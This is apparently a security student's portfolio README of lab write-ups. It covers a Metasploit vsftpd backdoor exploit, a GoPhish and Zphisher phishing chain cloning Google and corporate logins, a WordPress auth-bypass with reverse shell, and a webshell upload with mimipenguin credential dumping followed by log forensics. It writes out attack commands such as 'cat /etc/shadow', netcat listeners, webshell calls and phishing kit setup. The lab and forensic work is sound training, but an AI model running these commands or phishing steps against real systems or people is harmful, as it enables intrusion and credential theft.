>  🔴 Offensive security lab write-ups  
 
All labs conducted in isolated VirtualBox environments or on authorised external targets.
No unauthorised systems were accessed. All work complies with Swiss law and ethical hacking standards.

---

## 📁 Labs

Offensive security · Penetration testing · Exploitation · Phishing simulation

| # | Lab | Tools | Status |
|---|---|---|---|
| 01 | Network Penetration Testing | nmap · Metasploit · Hydra | ✅ Complete |
| 02 | GoPhish Phishing Simulation & Offensive Email Attack Chain | GoPhish · Zphisher · SET · Ngrok · Cloudflared · Postfix | ✅ Complete  |
| 03 | WordPress Full Compromise (Bigware/Dockerlabs) — CVE-2025-34077 | nmap · WPScan · Metasploit · netcat | ✅ Complete |
| 04 | WordPress — CVE-2020-25213 ( Purple Team) | curl · bash · Apache logs · mimipenguin | ✅ Complete |
| 05 | Web App Security Analysis (Burp Suite / OWASP ZAP)	Burp Suite · OWASP ZAP  |  Browser DevTools | 	🔜 Coming soon | 

---

### 01 Network Penetration Testing Lab
Simulated an SMB brute-force attack from Kali Linux against a Windows 10 target, then switched to analyst mode and investigate the attack using Windows forensic artifacts — proving execution,
identifying the attack timeline, and documenting findings in IR report format. This lab demonstrates the complete SOC analyst workflow:
Attack simulation (Kali) → Artifact collection (WIN10test) → Forensic parsing (EZ Tools) → IR report
<br>**Tools:** nmap · CrackMapExec · Hydra · PECmd · AmcacheParser · AppCompatCacheParser · EvtxECmd · EZ Tools Suite
<br>Target: Target: WIN10TEST ($VICTIMIP) — SMB port 445

- ✅ Key Finding — Brute Force Attack Reconstructed from Logs

- ✅ Network scanning with nmap (SYN, version, OS detection)
- ✅ Service enumeration and vulnerability mapping
- ✅ Exploitation via Metasploit Framework
- ✅ Brute force attacks with Hydra

**Commands:**
```bash
Phase 1 Reconnaissance
# sudo netdiscover -r $HOST/24 -i eth0
# sudo nmap $HOST                          # basic scan
# sudo nmap -T5 -sV $HOST                  # version detection
# sudo nmap --script=vuln -p 21 $HOST      # vulnerability confirmation
Phase 2 Exploitation
# msfconsole
# msf6 > search vsftpd
# msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
# msf6 > set RHOSTS $HOST
# msf6 > run
Phase 3 Post-Exploitation
# whoami
# hostname
# pwd
# ls /
# cat /etc/shadow
# nc $HOST 1524                            # secondary backdoor
```
                       
**nmap version scan — identifying vsftpd 2.3.4**
<br><img width="610" height="165" alt="image" src="https://github.com/user-attachments/assets/d3ff4093-4ccb-429f-9ce7-41f16b4d0dc2" />

**vulnerability Confirmation**
<br><img width="418" height="134" alt="image" src="https://github.com/user-attachments/assets/964b4ae0-2f73-4d9a-a06e-9bbf77c113fc" />

**metasploit — root shell obtained**
<br><img width="550" height="165" alt="image" src="https://github.com/user-attachments/assets/5338c658-d205-43ff-83bb-1a3d9842fba4" />
<br><img width="611" height="222" alt="image" src="https://github.com/user-attachments/assets/5a2bb5d0-0543-47ba-8c73-fb09a3521b5d" />

> 📄 **[Download Full Lab Report (PDF)](https://github.com/jaalso/cybersecurity-portfolio/raw/main/Pentest_Lab_Writeup_protected.pdf)**
<br>🔒 Password protected — contact me via [LinkedIn](https://linkedin.com/in/jaalso) to request access

---

### 02 GoPhish: Phishing Simulation & Offensive Email Attack Chain
Complete offensive email attack chain across 6 phases — from infrastructure setup through
credential capture and campaign tracking. Mirrors the functionality of commercial platforms
like KnowBe4, Hoxhunt, and Riot at zero cost.
<br>**Tools:** GoPhish · Zphisher · SET · swaks · Ngrok · Cloudflared · CyberChef · Postfix

Phase 1 — Infrastructure Setup
- ✅ GoPhish v0.12.1 deployed on Kali Linux — admin panel at https://127.X.X.X:3XXX
- ✅ Gmail SMTP configured as authenticated relay with App Password
- ✅ Ngrok + Cloudflared + LocalXpose tested as tunnel options — no paid domain required
- ✅ DNS persistence fix — /etc/resolv.conf locked with chattr +i to survive sudo sessions
- ✅ SMTP delivery verified with swaks independently before GoPhish configuration

```bash
GoPhish setup
# chmod +x gophish
# sudo ./gophish                           # launch admin panel at https://12X.X.X.X:XXXX

DNS persistence fix — survives sudo and reboots
# echo "nameserver X.X.X.X" | sudo tee /etc/resolv.conf
# sudo chattr +i /etc/resolv.conf          # lock file from being overwritten

Verify DNS resolution
# ping smtp.xxxx.com -c 3
```

Phase 2 — Credential Harvesting Pages
- ✅ Zphisher — pixel-perfect Google login clone, credentials captured to auth/usernames.dat
- ✅ SET (Social Engineering Toolkit) — cloned Schroders eServices corporate login portal; visually identical to real page
- ✅ Three tunnel services tested: Cloudflared (no account) · Ngrok · LocalXpose

```bash
Sending sample email with Swaks
# swaks --to $RECIPIENTEMAIL$ \
#       --from $SENDEREMAIL$ \
#       --server smtp.£HOSTEMAIL.com:$PORT \
#       --auth LOGIN \
#       --auth-user $SENDEREMAIL$ \
#       --auth-password [APP_PASSWORD] \
#       --tls
# Expected: 235 2.7.0 Accepted — authentication successful
# Expected: 250 2.0.0 OK — email accepted for delivery
```

Phase 3 — Email Delivery
- ✅ Postfix direct relay failed — Outlook rejected port 25 from unknown IP (Layer 1 IP reputation gateway confirmed)
- ✅ Gmail SMTP relay succeeded — authenticated relay bypasses reputation checks
- ✅ swaks verified SMTP authentication independently (235 2.7.0 Accepted)

```bash
Launch Zphisher
# git clone https://github.com/htr-tech/zphisher.git
# cd zphisher
# chmod +x zphisher.sh
# bash zphisher.sh                       
# Victim IP saved to:   auth/ip.txt
```

Phase 4 — Email Template Crafting
- ✅ Version 1 — custom Google security alert HTML with {{.FirstName}} and {{.URL}} variables
- ✅ Version 2 — real Google security alert cloned using forensic skills in reverse:

Exported .eml from Outlook
Decoded quoted-printable encoding with CyberChef 
<br><img width="600" height="925" alt="image" src="https://github.com/user-attachments/assets/9cbcbb6e-111e-498f-99b0-a4a452a16e9d" />

Phase 5 — GoPhish Campaign Results
<br><img width="600" height="939" alt="image" src="https://github.com/user-attachments/assets/c6c98bc5-364c-4864-97fa-38bad07c9ddd" /> 
<br><img width="600" height="549" alt="image" src="https://github.com/user-attachments/assets/45dcf5f6-cdb7-4291-8dc1-beb906bac0ae" />
```bash
sudo setoolkit
# Post-back IP: 127.x.x.x
# URL to clone: https://victimurl
Expose via Ngrok
# ngrok http $PROTOCOL
```
| Metric | Result | Notes |
|---|---|---|
| Email Sent | ✅ 1 | Delivered via Gmail SMTP |
| Email Opened | ✅ 1 | Tracking pixel loaded by Outlook |
| Clicked Link | ✅ 1 | Victim clicked "Verify My Account" |
| Submitted Data | ⚪ 0 | Redirect configured |
| Email Reported | ⚪ 0 | Victim did not report as phishing |
| Delivery location | ⚠️ Junk | Low sender reputation |

Phase 6 — Combined Attack Chain (GoPhish + Zphisher)
<br><img width="443" height="299" alt="image" src="https://github.com/user-attachments/assets/bd3254ac-4daf-45d5-a0c7-6e077d93b8af" />
| Step | Component | Action | Result |
|---|---|---|---|
| 1 | GoPhish | Sends phishing email via Gmail SMTP | Email delivered to target |
| 2 | Victim | Opens email | GoPhish records ✅ Email Opened |
| 3 | Victim | Clicks "Check Activity" button | GoPhish records ✅ Clicked Link |
| 4 | GoPhish | Redirects via tracking link to Zphisher URL | Request reaches Zphisher server |
| 5 | Zphisher | Serves pixel-perfect Google login clone | Victim sees convincing fake page |
| 6 | Victim | Enters email and password | Zphisher captures credentials |
| 7 | Zphisher | Saves to auth/usernames.dat + auth/ip.txt | Attacker has credentials + victim IP |
| 8 | Zphisher | Redirects victim to real accounts.google.com | Victim thinks login failed, tries again |

Authentication Analysis
| Check | Result | Why It Passed | What It Missed |
|---|---|---|---|
| SPF | ✅ PASS | Gmail authorised to send for gmail.com | Cannot check message intent or content |
| DKIM | ✅ PASS | Email signed by Gmail's valid DKIM key | Signing domain ≠ legitimate purpose |
| DMARC | ✅ PASS | From domain aligns with DKIM signing domain | p=none on Gmail means no enforcement |
| Outlook delivery | ⚠️ Junk | Low sender reputation score | Still delivered — just to Junk |
| MFA | 🛡️ Would block | Requires second factor | Only control that fully stops attack |

MITRE ATT&CK Mapping
| Technique | ID | Tool Used | Description |
|---|---|---|---|
| Phishing | T1566 | GoPhish + Zphisher | Primary attack vector |
| Spearphishing Link | T1566.002 | GoPhish campaign | Email with tracked phishing URL |
| Acquire Infrastructure | T1583 | Ngrok · Cloudflared · LocalXpose | Tunnel services as attack infrastructure |
| Compromise Infrastructure | T1584 | Gmail account | Legitimate service abused for SMTP relay |
| Masquerading | T1036 | Google email clone · URL masking | Impersonating legitimate Google alerts |
| Credentials from Web Browsers | T1555.003 | Zphisher | Harvesting submitted login credentials |
| Valid Accounts | T1078 | Captured credentials | Would enable account access post-capture |

This lab successfully demonstrated the complete offensive email attack chain from infrastructure
setup through credential capture and campaign tracking. Six distinct phases were executed,
covering three phishing page tools, four tunnel services, two SMTP delivery methods, two email
template approaches, and one full integrated campaign combining GoPhish and Zphisher

> 📄 **[Download Full Lab Report (PDF)](https://github.com/jaalso/cybersecurity-portfolio/raw/main/offensive_email_chain_report_protected.pdf)**
<br>🔒 Password protected — contact me via [LinkedIn](https://linkedin.com/in/jaalso) to request access

---


### 03 WordPress Full Compromise (CVE-2025-34077 · Dockerlabs Bigwear)
Attribution: Lab built following Mario Álvarez's Dockerlabs tutorial. All commands executed independently in an isolated lab environment. Both manual Python PoC and Metasploit exploitation methods practiced.
<br>**Tools:** nmap · WPScan · wappalyzer · Metasploit · Burp Suite · netcat · curl · Python3
<br>Target: Dockerlabs Bigwear ($IPADDRESS) — intentionally vulnerable Docker container
<br>CVE: CVE-2025-34077 — Pie Register ≤ 3.7.1.4 Authentication Bypass

<br>Attack Chain:
| Phase | Technique | Tool | Result |
|---|---|---|---|
| 01 | Reconnaissance | nmap · Wappalyzer | WordPress 6.9.4 · Apache 2.4.52 · 3 ports |
| 02 | Enumeration | WPScan · curl · searchsploit | admin user + Pie Register 3.7.1.4 → CVE match |
| 03 | Auth Bypass | CVE-2025-34077 Python PoC | Admin cookies without password |
| 04 | Admin Access | Cookie injection via DevTools | /wp-admin/ as admin |
| 05 | RCE | PHP reverse shell via WP File Manager | www-data shell on port 9001 |
| 06 | Privilege Escalation | Hardcoded creds in settings.py | `su root` → uid=0(root) ✅ |

- ✅ Root shell achieved — BigWear2024!@# found in /opt/bigware/backend/settings.py
- ✅ Both Python PoC and Metasploit module practiced as verification
- ✅ Cookie encoding bug identified and fixed (unicode corruption from terminal copy-paste)
- ✅ Password reuse finding — Django admin password reused as Linux root password

<br>Commands:
```bash
# Phase 1 Reconnaissance
# TCP connect scan — required for Docker bridge network
# sudo nmap -p 80,3000,8000 -sT -vvv $TARGETIP
# Phase 2 — WordPress Enumeration
# wpscan --url http://$TARGETIP --enumerate u,p
# curl -s http://$TARGETIP/wp-content/plugins/pie-register/readme.txt
# searchsploit pie register
# exact version match
# Phase 3 — CVE-2025-34077 Authentication Bypass
# git clone https://github.com/MrNAME/CVE-2025-34077
# cat pie.py                                               # review code before execution
# python3 pie.py http://$TARGETIP > /tmp/cookies.txt
# curl -s -b "$(grep 'wordpress_' /tmp/cookies.txt | sed 's/ = /=/g')" \
# http://$TARGETIP/wp-admin/ | grep -i "dashboard"
# Phase 4 — Reverse Shell → Root
# Netcat listener (separate terminal)
# nc -lvnp 9001
# Post-exploitation
# find / -name "settings.py" 2>/dev/null
# cat /opt/bigware/backend/settings.py
# hardcoded: $PASSWORD
# su root
# whoami
# root ✅
```
 <br>Findings:
| ID | Finding | Severity |
|---|---|---|
| F-01 | Unauthenticated auth bypass — CVE-2025-34077 (Pie Register ≤ 3.7.1.4) | 🔴 Critical |
| F-02 | RCE via unrestricted PHP file editing in WP File Manager | 🔴 Critical |
| F-03 | Hardcoded credentials in `/opt/bigware/backend/settings.py` | 🔴 Critical |
| F-04 | Password reuse — Django admin password = Linux root password | 🔴 Critical |
| F-05 | Outdated plugin — Pie Register 3.7.1.4 vs patched 3.8.4.9 | 🟡 High |

 
**Inject the reverse shell payload via File Manage**
<br><img width="403" height="266" alt="image" src="https://github.com/user-attachments/assets/42c4deae-05df-4f2f-9219-670277d9dcbf" />

**hardcoded credentials**
<br><img width="676" height="510" alt="image" src="https://github.com/user-attachments/assets/c41c1651-5618-4281-9b5d-df3111799878" />

**Privilege escalation:**
<br><img width="223" height="120" alt="image" src="https://github.com/user-attachments/assets/426b79bd-2245-4791-a73b-9c9a6f2054b7" />


---

### 04 WordPress Purple Team — CVE-2020-25213
Lab type: Self-directed purple team exercise — built from scratch, attacked, then forensically investigated -> Three-phase purple team lab — built a vulnerable WordPress server from scratch (Phase 1),exploited it via unauthenticated file upload CVE (Phase 2), then switched to analyst modeand reconstructed the full attack timeline from Apache logs (Phase 3). CVE-2020-25213: WP File Manager ≤ 6.8 ships connector.minimal.php — a library example file with no authentication, no file type restrictions, and no rate limiting. Any unauthenticated
user can POST files directly to the web server filesystem.
<br>**Tools:** curl · find · grep · md5sum · mimipenguin · Apache logs
<br>Target: Ubuntu 22.04 VM built from scratch ($IPADDRESS)

<br>Lab Phases:
| Phase | Duration | Activity |
|---|---|---|
| Phase 1 — Environment Setup | ~2h | LAMP + WordPress + WP File Manager 6.0 from scratch |
| Phase 2 — CVE Attack | ~30min | Unauthenticated file upload → webshell → credential dumping |
| Phase 3 — Forensic Investigation | ~1h | Apache log analysis → full attack timeline reconstruction |

<br>Commands:
```bash
# Phase 1 — Environment Setup (Ubuntu 22.04)
# LAMP stack
# sudo apt install apache2 php mysql-server php-mysql -y
# WordPress installation
# wget https://wordpress.org/latest.tar.gz
# Install vulnerable plugin
# wget https://downloads.wordpress.org/plugin/wp-file-manager.6.0.zip
# sudo unzip wp-file-manager.6.0.zip -d /var/www/html/wp-content/plugins/
# Verify vulnerable endpoint is exposed
# curl http://IPADDRESS/.../lib/php/connector.minimal.php
# Phase 2 — CVE-2020-25213 Attack
# Step 1 — Verify target with harmless file upload
# echo "CVE-2020-25213 PoC" > /tmp/poc.txt
# curl http://IPADDRESS/.../lib/files/poc.txt
# Step 2 — Upload PHP webshell (31 bytes)
# Step 3 — Deploy credential dumper
# git clone https://github.com/huntergregal/mimipenguin.git
# curl "http://IPADDRESS/.../cmd.php?cmd=bash+.../mimipenguin.sh+2>&1"
# Phase 3 — Forensic Investigation (Apache Logs)
# Logs rotated — attack captured in access.log.1
# sudo grep "connector.minimal.php" /var/log/apache2/access.log.1
# File system analysis — attacker-uploaded files
#find /var/www/html/.../wp-file-manager/lib/files/ -type f
# ls -la .../lib/files/
# md5sum cmd.php poc.txt                                   # generate IOCs
# cat ~/.bash_history                                      # attacker trace
```
 <br>Attack Timeline:
| Time | IP | Method | Request | Analyst Note |
|---|---|---|---|---|
| 13:03:53 | $IPATACCKER | GET | connector.minimal.php | Attacker confirms target |
| 13:04:28 | $IPATACCKER | POST | connector.minimal.php | poc.txt uploaded |
| 13:05:50 | $IPATACCKER | POST | connector.minimal.php | cmd.php webshell uploaded |
| 13:06:13 | $IPATACCKER | GET | cmd.php?cmd=whoami | RCE confirmed |
| 13:06:36 | $IPATACCKER | GET | cmd.php?cmd=cat+/etc/passwd | /etc/passwd exfiltrated |
| 13:07:24 | $IPATACCKER | POST | connector.minimal.php | mimipenguin uploaded |
| 13:07:56 | $IPATACCKER | GET | cmd.php?cmd=bash+mimipenguin | Credential dump |

 <br>Findings
| ID | Finding | Severity |
|---|---|---|
| F-01 | Unauthenticated file upload — CVE-2020-25213 (WP File Manager ≤ 6.8) | 🔴 Critical |
| F-02 | World-writable upload directory (`drwxrwxrwx`) | 🔴 Critical |
| F-03 | RCE via 31-byte PHP webshell — full OS command execution as www-data | 🔴 Critical |
| F-04 | Credential dumping tool (mimipenguin) deployed successfully | 🟡 High |

 <br>OWASP Top 10 Mapping:
| OWASP | Category | Finding |
|---|---|---|
| A02 | Cryptographic Failures | Hardcoded credentials in settings.py (Lab 03) |
| A03 | Injection | PHP code injection via file upload / editor |
| A05 | Security Misconfiguration | World-writable dirs · debug files exposed |
| A06 | Vulnerable & Outdated Components | CVE-2025-34077 · CVE-2020-25213 |
| A07 | Identification & Authentication Failures | Auth bypass via Pie Register CVE |

**SSH to Ubuntu01 vulnerable VM**
<br><img width="344" height="57" alt="image" src="https://github.com/user-attachments/assets/69feb540-5808-447b-abec-81873f7320af" />

**WP File Manager 6.8 (vulnerable plugin deployment)**
<br><img width="1014" height="110" alt="image" src="https://github.com/user-attachments/assets/4ea6c49b-971e-4f5e-b571-c9fbdc7a98fe" />

**Target check pre payload deploy**
<br><img width="996" height="148" alt="image" src="https://github.com/user-attachments/assets/23d22776-ac5b-4737-945a-990c543f8f91" />

**Uploaded webshell**
<br><img width="759" height="177" alt="image" src="https://github.com/user-attachments/assets/531febd2-ae2b-4dd8-9041-5a3f8b0dff46" />

** Apache log analysis**
<br><img width="659" height="141" alt="image" src="https://github.com/user-attachments/assets/67361eed-f473-40b8-ab69-09c9f4d28d97" />

> 📄 **[Download Full Lab Report (PDF)](https://github.com/jaalso/cybersecurity-portfolio/raw/main/Lab04b_Phase3_Triage_Report_protected.pdf)**
<br>🔒 Password protected — contact me via [LinkedIn](https://linkedin.com/in/jaalso) to request access

---

## 🧰 Tools Used

| Category | Tools |
|---|---|
| Scanning & Recon | nmap · netdiscover · Wireshark · TShark · Wappalyzer |
| Exploitation | Metasploit · Hydra · CrackMapExec |
| Web App Testing | WPScan · Burp Suite · curl · searchsploit |
| CVE Exploitation | Python3 PoC · CVE-2025-34077 · CVE-2020-25213 |
| Phishing Simulation | GoPhish · Zphisher · SET |
| Email Testing | swaks · CyberChef · emlAnalyzer |
| Tunneling | Ngrok · Cloudflared · LocalXpose |
| Post-Exploitation | Metasploit shell · netcat · mimipenguin |
| Forensics | Apache logs · bash · find · grep · md5sum |
| Platform | Kali Linux · Metasploitable 2 · VirtualBox · Docker |

---

## ⚖️ Legal & Ethical Notice

All offensive security activities were conducted exclusively in:
- Isolated VirtualBox lab environments (no external connectivity)
- Authorised external targets (vuln.land)
- Training platforms (TryHackMe, HackTheBox)

No unauthorised systems were accessed. All work complies with Swiss law.
